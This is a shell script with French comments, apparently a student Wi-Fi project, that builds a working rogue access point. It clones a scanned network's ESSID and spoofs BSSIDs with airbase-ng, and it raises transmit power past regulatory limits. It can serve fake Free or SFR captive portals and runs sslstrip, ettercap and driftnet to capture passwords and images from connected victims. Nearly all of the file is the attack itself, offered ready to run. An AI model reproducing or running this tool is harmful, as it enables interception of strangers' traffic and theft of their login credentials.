#!/bin/sh

# rogueAP.sh | Projet WIFI Rogue Access Point v1.2
# memo 1.1 Ajout support portail free et sfr
# memo 1.2 Creation script getip.sh pour la création de regles automatique iptables

# Version
version='0.6'

# variable pour la valeur entree
param1=$1

iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo "0" > /proc/sys/net/ipv4/ip_forward

##################
# Fonction Début #
##################

# Controle lancement en droit root

function checkUID(){

    if [ ! "$UID" -eq 0 ]; then
        echo -e "You must be 'root' to execute this script"
        echo -en "Your UID should be 0, it is $UID\n"
        exit 1
    fi
}

# Controle adresse ip configure

function checkIpAddress(){
    
    testIP=`ifconfig | sed 's/addr:127.0.0.1//' | grep -o "inet addr" 1>/dev/null`
    if [ $? -eq 1 ]; then
        echo -e "[!!] Can't find your IP\nMake sure your physical interface has an IP"
        exit 1
    fi
}

# Controle si gateway exist

function checkGateway(){

    testUG=`route -n -A inet | grep -o "UG" 1>/dev/null`
    if [ $? -eq 1 ]; then
        echo "[!!]  Cant find your gateway IP"
        exit
    fi
}

# Portal Free

function checkWebServices(){

	apache2PID=`pidof apache2`
	if [ ! -z "$apache2PID" ]; then
		service apache2 restart > /dev/null
		if [ $? -eq 0 ]; then
			echo "[+] INFO: Apache2 restarted"
    	else
			echo "[!] Failed to restart Apache2"
		fi
	else
		service apache2 start > /dev/null
		if [ $? -eq 0 ]; then
			echo "[+] INFO: Apache2 started"
    	else
			echo "[!] Failed to start Apache2"
		fi
	fi

	mysqlPID=`pidof mysqld`
	if [ ! -z "$mysqlPID" ]; then
		service mysql restart > /dev/null
		if [ $? -eq 0 ]; then
			echo "[+] INFO: Mysql restarted"
    	else
			echo "[!] Failed to restart Mysql"
		fi
	else
		service mysql start > /dev/null
		if [ $? -eq 0 ]; then
			echo "[+] INFO: Mysql started"
    	else
			echo "[!] Failed to start Mysql"
		fi
	fi

}

checkUID; checkIpAddress; checkGateway;

if [ "$param1" == "help" ] || [ "$param1" == "" ] || [ "$param1" == "wlan" ]; then
    echo -e "Usage: ./rogueAP.sh wlan0\nrogueAP - version $version"
    exit 0
fi

# test, peut etre commente
# ifconfig wlan0 down

#############
# Variables #
#############

# variable fichier wifiscan
exportWifi='/tmp/export.wifi'

# log activite du script
log='/var/log/rogueAP.log'

# chope la date en cours
getDate=`date '+[%d/%m/%Y][%H:%M:%S]'`

########
# DRAW #
########

#iwlist $interface scan | egrep -i "ESSID:|Address: |Channel:" | sed 's/^\([a-z]*\)\([^a-z]*\)\([a-z]*\)/\3\2\1/' | 's/Address//;s/Channel://;s/ESSID://' | sed 's/Cell [0-9]* - : //' | sed -e 's/^[ \t]*//' > /tmp/export.wifi; cat /tmp/export.wifi

#######################
# Fonctions Programme #
#######################

function wifiScan(){
echo "[+] Scanning Access Point around you ..."

iwlist $param1 scan | egrep -i "ESSID:|Address: |Channel:|Quality=" | sed 's/Address/BSSID/' | sed -e 's/Cell [0-9]* - //' -e 's/^[ \t]*//' -e '1!G;h;$!d' | awk ' {print;} NR % 4 == 0 { print ""; }' > $exportWifi; xterm -rightbar -geometry 75x100+1+0 -T "List of Access Points" -e "cat $exportWifi; echo -en 'Press a key to close this window ...'; read" 2>/dev/null & wifiScanPID=$!
}

#########
# BEGIN #
#########

#log-facility local7;
# DHCP Configuration Update
echo "ddns-update-style none;

default-lease-time 600;
max-lease-time 7200;

log-facility local7;

authoritative;

subnet 10.0.0.0 netmask 255.255.255.0 {
option routers 10.0.0.1;
option subnet-mask 255.255.255.0;

option domain-name "\"$essid\"";
option domain-name-servers 8.8.8.8, 8.8.4.4;

range 10.0.0.20 10.0.0.50;

}" > /etc/dhcp3/dhcpd.conf

echo "$getDate [BEGIN] rogueAP is starting ..." >> $log

iwconfig 1>& /tmp/wireless

testWifiCard=`grep -o "$param1" /tmp/wireless`
    
if [ -z $testWifiCard  ]; then
    echo -e "$getDate [!!] ERROR: Wireless card not found." >> $log
    echo -e "Try : # lspci | grep 'Wireless'; lsusb | grep 'Wireless'"
    echo -e "$getDate rogueAP stopped" >> $log
    exit 1
fi

clear
echo "[ $(date +%d)/$(date +%m)/$(date +%Y) - $(date +%H):$(date +%I) ][ Hostname is $(hostname) ]"
echo -e "\n  ############################\n  # rogueAP WifiProject v$version #\n  ############################\n"

echo -e " 1. Current Mode
 2. Advanced Mode
 3. Pripyat Mode\n"

while [ -z $powerMode ]; do 
    echo -n "Choose your wireless power mode ? > "
    read powerMode
done

if [ $powerMode == "2" ]; then 
    iw reg set BO 2>/dev/null
    if [ $? -eq 1 ]; then
        echo "something went wrong, continuing"
    fi
    elif [ $powerMode == "3" ]; then
        iw reg set BO 2>/dev/null
            if [ $? -eq 1 ]; then
                echo "[!] Something went wrong, continuing"
            fi
        sleep 1
        iwconfig $param1 txpower 30
            if [ $? -eq 1 ]; then
                echo "[!] Something went wrong, continuing"
                iw reg set FR
            fi
else
    continue
fi

echo ""

ifconfig | awk '{print $param1}' | grep -qo "$param1" > /dev/null
if [ $? -eq 1 ]; then
    echo -e "[!] WARNING: Interface $param1 is down"; sleep 1; echo "[+] INFO: Trying to turn up $param1 ..."
    ifconfig $param1 up 2> /dev/null
        if [ $? -eq 0 ]; then 
            echo -e "[+] INFO: $param1 is now up"
            sleep 1
        else
            echo "$getDate [!!] ERROR: Can't turn up $param1" | tee -a $log
            echo -e "$getDate rogueAP stopped" >> $log
            exit 1
        fi
else
    echo -e "[+] INFO: $param1 already up, moving forward ..."
fi

# Montage d'une RogueAP

# check if wireless card up

# scan wireless network and get essid, bssid and channel

echo -n "[?] Want to scan around you ? (y/n) > "
read answerScan

if [ $answerScan == "y" ]; then
	wifiScan
fi

echo "$getDate wifiScan done" >> $log

# ask question to create the fake ap with previous scanned informations

getGateway=`route -n -A inet | grep UG | awk '{print $2}' | uniq`

while [ -z "$networkGateway" ]; do
    echo -en "[?] Enter your gateway ( $getGateway ? ) > "
    read networkGateway
done

getInterface=`route -n | grep $networkGateway | awk '{print $8}' | uniq`

while [ -z "$networkInterface" ]; do
    echo -en "[?] Enter interface connected to your local network ( $getInterface ? ) > "
    read networkInterface
done

while [ -z "$portal" ]; do
    echo -en "[?] Would you like to use an access portal ? (y/n) > "
    read portal
done

# Portail Selection

if [ "$portal" == "y" ] || [ "$portal" == "Y" ]; then
echo -e "Portal selection :\n1. Free\n2. Sfr"    
    while [ -z "$portalSelection" ]; do    
        echo -en "[?] Which portal ? (1/2) > "
        read portalSelection
    done

    if [ "$portalSelection" == "1" ]; then
        cp /etc/apache2/sites-available/confPortal/freewifi/default /etc/apache2/sites-available/
		checkWebServices
		xterm -geometry 75x20+1+375 -T "DHCP - It's a trap" -e dhcp/./getip.sh & ItsATrap=$!
    elif [ "$portalSelection" == "2" ]; then
        cp /etc/apache2/sites-available/confPortal/sfrwifi/default /etc/apache2/sites-available/
		checkWebServices
		xterm -geometry 75x20+1+375 -T "DHCP - It's a trap" -e dhcp/./getip.sh & ItsATrap=$!
    else
        continue
    fi
fi

echo -e "[+] INFO: Steal an identity or create a new one"
while [ -z "$essid" ]; do
    echo -ne "[?] Enter an ESSID > "
    read essid
done

while [ -z "$channel" ]; do
    echo -ne "[?] Enter a Channel > "
    read channel
done

while [ -z "$answerBSSID" ]; do
    echo -en "[?] Want to change BSSID ? (y/n) > "
    read answerBSSID
done

if [ "$answerBSSID" == "Y" ] || [ "$answerBSSID" == "y" ] ; then
	echo -n "[+] INFO: Example of FreeBox's MAC : "
	python genmac.py     
	while [ -z "$bssid" ]; do
        echo -ne "[?] Enter a BSSID > "
        read bssid
    done
fi

# try to switch wireless card in monitor mode

#echo -e "[+] INFO: Switching $param1 in monitor mode ..."
airmon-ng start $param1 > /dev/null
networkFakeInterface="mon0"
echo -e "$getDate $networkFakeInterface is up" >> $log
# check if monitor mode result is ok or not

if [ $? -eq 0 ]; then
    echo "[+] INFO: Monitor mode activated"
else
    echo "$getDate [!!] ERROR: Switching $param1 in monitor mode failed" | tee -a $log
    exit 1
    echo -e "$getDate rogueAP stopped" >> $log
fi

# killing scan wifi window
wifiScanPID=`ps aux | grep xterm | grep "List" | awk '{print $2}'`
if [ ! -z "wifiScanPID" ]; then
	kill ${wifiScanPID} 2> /dev/null
fi

# starting fake ap with data entered by users in new terminal window
if [ ! -z "$bssid" ]; then
    xterm -geometry 75x15+1+0 -T "FakeAP - $essid" -e airbase-ng -e "$essid" -c $channel -a $bssid $networkFakeInterface & fakeApPID=$!
else
    xterm -geometry 75x15+1+0 -T "FakeAP - $essid" -e airbase-ng -e "$essid" -c $channel $networkFakeInterface & fakeApPID=$!
fi
echo "$getDate FakeAP - AP : $essid is up" >> $log 
sleep 2 

#Configuration network
echo "[+] INFO: Configuring interface and iptables"
sleep 1
ifconfig lo up
ifconfig at0 up
sleep 1
#echo $networkInterface
ifconfig at0 10.0.0.1 netmask 255.255.255.0
#ifconfig at0 mtu 1400
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
#route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.0.0.1 at0
echo "1" > /proc/sys/net/ipv4/ip_forward
#test
#iptables -t nat -A PREROUTING -p udp -j DNAT --to $networkGateway
iptables -P FORWARD ACCEPT
#iptables --append FORWARD --in-interface at0 -j ACCEPT
iptables --table nat --append POSTROUTING --out-interface $networkInterface -j MASQUERADE


# Starting DHCP
echo "[+] INFO: Starting DHCP ..."
sleep 1
xterm -geometry 75x20+1+150 -T DHCP -e dhcpd3 -d -f -cf "/etc/dhcp3/dhcpd.conf" -pf "/var/run/dhcp3-server/dhcpd.pid" at0 & dhcpPID=$!
echo "$getDate dhcp is up" >> $log 
sleep 3

while [ -z "$answerSslstrip" ]; do
	echo -n "[?] Want to start sslstrip ? (y/n) > "
	read answerSslstrip
done

if [ "$answerSslstrip" == "y" ] || [ "$answerSslstrip" == "Y" ]; then
	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000	
	# Sslstrip
	echo "[+] INFO: Starting sslstrip ..."
	xterm -geometry 80x5+465+700 -T sslstrip -e sslstrip -w secret.txt -p -l 10000 & sslstripPID=$!
	echo "$getDate sslstrip is up" >> $log
	sleep 2

	# ettercap capture password
	echo "[+] INFO: Starting ettercap ..."
	xterm -geometry 80x20+465+0 -T ettercap -s -sb -si +sk -sl 5000 -e ettercap -p -u -T -q -w /var/log/rogueAP/passwords -i at0 & ettercapPID=$!
	echo "$getDate ettercap is up" >> $log
	sleep 2

	#log sslstrip
	echo "[+] INFO: Starting log sslstrip ..."
	xterm -geometry 80x16+465+310 -T SSLStrip-Log -e tail -f /root/Desktop/projetWifi/sslstrip.log & sslstriplogPID=$!
	echo "$getDate sslstriplog is up" >> $log
	sleep 2
else
	continue
fi

# tcpdump
#xterm -geometry 75x20+1+375 -T "tcpdump" -e tcpdump -nni at0 port 80 & tcpdumpPID=$!
#echo "$getDate tcpdump is up" >> $log
#sleep 2


# Driftnet
while [ -z "$answerDrift" ]; do
    echo -en "[?] Want to start Driftnet - can slow the network ? (y/n) > "
    read answerDrift
done

if [ "$answerDrift" = "y" ]; then
    #while [ -z "$folderDrift" ]; do
     #   echo -en "[?] Which folder to use for stocking images ? > "
     #   read folderDrift
    #done

    echo "[+] Starting driftnet ..."
    #driftnet -i $networkInterface -p -d /root/Desktop/projetWifi/driftnetdata/ 2>/dev/null & driftnetPID=$!
    driftnet -i $networkInterface -p -d /root/Desktop/projetWifi/driftnetdata/ 2>/dev/null & driftnetPID=$!
    echo "$getDate driftnet is up" >> $log
fi

echo "[+] INFO: Wait for client try to reach auth website"
#while [ $answerStop != 'y' ] || [ $answerStop != 'Y' ]; do
echo -en "[?] Want to stop ? (y/n) > "
read answerStop


if [ $answerStop == "Y" ] || [ $answerStop == "y" ]; then
    echo "[+] INFO: Cleaning up everything ..."
    kill ${fakeApPID}
    kill ${dhcpPID}
    #kill ${tcpdumpPID} 
	
	if [ ! -z $sslstripPID ]; then
		kill ${sslstriplogPID}
		kill ${sslstripPID}
		kill ${ettercapPID}
	fi

    if [ ! -z $driftnetPID ]; then
        kill ${driftnetPID}
    fi
  
    echo "[+] INFO: Cleaning iptables ..."
    echo "0" > /proc/sys/net/ipv4/ip_forward
    iptables --flush
    iptables --table nat --flush
    iptables --delete-chain
    iptables --table nat --delete-chain
    echo "[+] INFO: iptables cleaned"
    echo "[+] INFO: Stopping $networkFakeInterface ..."
    airmon-ng stop $networkFakeInterface > /dev/null

    if [ $? -eq 0 ]; then
        echo "[+] INFO: $networkFakeInterface stopped"
    else
        echo "[!] Can't stop $networkFakeInterface"
    fi

    if [ ! "$powerMode" -eq "1" ]; then
        iw reg set FR
        iwconfig $param1 txpower 20
    fi

	if [ ! -z "$portalSelection" ]; then
		service mysql stop > /dev/null
		service apache2 stop > /dev/null
		kill ${ItsATrap}
	fi

    echo -e "[+] INFO: Done"
    echo -e "$getDate [END] rogueAP stopped correctly" >> $log
	rm /root/Desktop/projetWifi/dhcp/log 2> /dev/null
    exit 0
fi
